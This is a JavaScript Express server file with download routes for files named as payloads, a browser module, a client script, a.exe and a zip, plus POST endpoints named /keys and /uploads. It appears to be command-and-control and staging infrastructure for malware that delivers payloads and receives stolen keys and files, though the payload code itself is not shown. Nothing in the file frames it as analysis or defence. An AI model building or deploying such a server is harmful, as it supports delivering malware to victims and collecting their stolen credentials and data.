// Import the required modules
const express = require("express");
const path = require("path");

// Initialize the Express app
const app = express();

// Define the port
const PORT = process.env.PORT || 1244;

// Create a route to download the file
app.get("/j/baby1", (req, res) => {
  // Define the file path relative to the current directory
  const filePath = path.join(__dirname, "modules", "gjs_baby1.js");

  // Send the file for download
  res.download(filePath, "gjs_baby.js", (err) => {
    if (err) {
      console.error("Error downloading the file:", err);
      res.status(500).send("Error downloading the file");
    }
  });
});

app.get("/p", (req, res) => {
  // Define the file path relative to the current directory
  const filePath = path.join(__dirname, "modules", "package.json");

  // Send the file for download
  res.download(filePath, "package.json", (err) => {
    if (err) {
      console.error("Error downloading the file:", err);
      res.status(500).send("Error downloading the file");
    }
  });
});

app.get("/pdown", (req, res) => {
  // Define the file path relative to the current directory
  const filePath = path.join(__dirname, "modules", "p.zip");

  // Send the file for download
  res.download(filePath, "p.zip", (err) => {
    if (err) {
      console.error("Error downloading the file:", err);
      res.status(500).send("Error downloading the file");
    }
  });
});

app.get("/client/baby1", (req, res) => {
  // Define the file path relative to the current directory
  const filePath = path.join(__dirname, "modules", "main_baby1.py");

  // Send the file for download
  res.download(filePath, "main_baby1.py", (err) => {
    if (err) {
      console.error("Error downloading the file:", err);
      res.status(500).send("Error downloading the file");
    }
  });
});

app.get("/payload/baby1", (req, res) => {
  // Define the file path relative to the current directory
  const filePath = path.join(__dirname, "modules", "pay_baby1.py");

  // Send the file for download
  res.download(filePath, "pay_baby1.py", (err) => {
    if (err) {
      console.error("Error downloading the file:", err);
      res.status(500).send("Error downloading the file");
    }
  });
});

app.get("/brow/baby1", (req, res) => {
  // Define the file path relative to the current directory
  const filePath = path.join(__dirname, "modules", "brow_baby1.py");

  // Send the file for download
  res.download(filePath, "brow_baby1.py", (err) => {
    if (err) {
      console.error("Error downloading the file:", err);
      res.status(500).send("Error downloading the file");
    }
  });
});

app.get("/adc/baby1", (req, res) => {
  // Define the file path relative to the current directory
  const filePath = path.join(__dirname, "modules", "any_baby1.py");

  // Send the file for download
  res.download(filePath, "any_baby1.py", (err) => {
    if (err) {
      console.error("Error downloading the file:", err);
      res.status(500).send("Error downloading the file");
    }
  });
});

app.get("/any", (req, res) => {
  // Define the file path relative to the current directory
  const filePath = path.join(__dirname, "modules", "a.exe");

  // Send the file for download
  res.download(filePath, "a.exe", (err) => {
    if (err) {
      console.error("Error downloading the file:", err);
      res.status(500).send("Error downloading the file");
    }
  });
});

app.post("/keys", (req, res) => {
  console.log(
    "Keys upload running------------------------------------------------->"
  );
});

app.post("/uploads", (req, res) => {
  console.log(
    "Uploads running------------------------------------------------->"
  );
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});

// Export the app for Vercel
module.exports = app;
